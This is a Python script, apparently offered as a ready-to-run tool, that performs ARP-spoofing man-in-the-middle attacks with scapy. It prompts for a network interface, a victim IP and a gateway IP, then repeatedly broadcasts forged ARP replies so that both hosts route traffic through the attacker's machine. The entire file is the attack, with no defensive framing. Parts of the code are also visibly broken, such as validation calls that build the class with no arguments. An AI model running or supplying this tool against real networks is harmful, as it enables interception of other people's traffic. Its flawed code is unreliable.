import netifaces
import socket
import ipaddress
from scapy.all import ARP, Ether, sendp


class MITM:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.mac = self.get_interface_mac(self.interface)
        self.broadcast = "ff:ff:ff:ff:ff:ff"

    def get_interface_mac(self, interface):
        try:
            return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
        except ValueError:
            raise ValueError(f"Invalid interface '{interface}'")

    def validate_ip(self, ip):
        try:
            return ipaddress.IPv4Address(ip)
        except ipaddress.AddressValueError:
            raise ValueError(f"Invalid IP address '{ip}'")

    def _create_arp_response(self, source_ip, target_ip, target_mac):
        return Ether(src=self.mac, dst=target_mac) / ARP(
            op=2, hwsrc=self.mac, hwdst=target_mac, psrc=source_ip, pdst=target_ip
        )

    def run_attack(self):
        arp_response_target = self._create_arp_response(
            self.gateway_ip, self.target_ip, self.broadcast
        )
        arp_response_gateway = self._create_arp_response(
            self.target_ip, self.gateway_ip, self.broadcast
        )

        print("MITM Running... Press Ctrl+C to stop the attack.")

        try:
            while True:
                sendp(arp_response_target, iface=self.interface)
                sendp(arp_response_gateway, iface=self.interface)
        except KeyboardInterrupt:
            print("\nMITM Attack Stopped.")


def print_available_interfaces():
    interfaces = netifaces.interfaces()
    print("\nAvailable network interfaces:")
    for i, interface in enumerate(interfaces, start=1):
        print(f"{i}. {interface}")
    print()


def select_interface():
    while True:
        print_available_interfaces()
        try:
            choice = int(input("Enter the number of the interface to use: "))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice - 1]
            else:
                print("Invalid choice. Please select a valid interface.")
        except ValueError:
            print("Invalid input. Please enter a number.")


if __name__ == "__main__":
    interfaces = netifaces.interfaces()
    if not interfaces:
        print("No network interfaces found.")
        exit(1)

    print_available_interfaces()
    interface = select_interface()

    target_ip = input("Enter the target IP address: ")
    gateway_ip = input("Enter the gateway IP address: ")

    try:
        target_ip = str(MITM().validate_ip(target_ip))
        gateway_ip = str(MITM().validate_ip(gateway_ip))
    except ValueError as e:
        print(e)
        exit(1)

    mitm = MITM(target_ip=target_ip, gateway_ip=gateway_ip, interface=interface)
    mitm.run_attack()
